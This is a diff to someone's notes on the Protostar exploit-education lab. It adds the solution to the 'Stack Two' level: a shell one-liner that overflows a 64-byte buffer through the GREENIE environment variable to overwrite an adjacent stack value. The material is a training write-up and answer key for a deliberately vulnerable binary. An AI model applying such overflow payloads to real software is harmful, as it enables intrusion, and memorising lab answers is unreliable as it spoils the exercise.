@@ -72,6 +72,12 @@ Things related to the lab:
 
 - reverse the order due to little endian format
 
+### Answer for Stack Two:
+
+`GREENIE=$(python -c 'print("A"*64 + "\x0a\x0d\x0a\x0d")') /opt/protostar/bin/stack2`
+
+- Idea similar to Stack One
+
 ### References
 
 https://exploit.education/
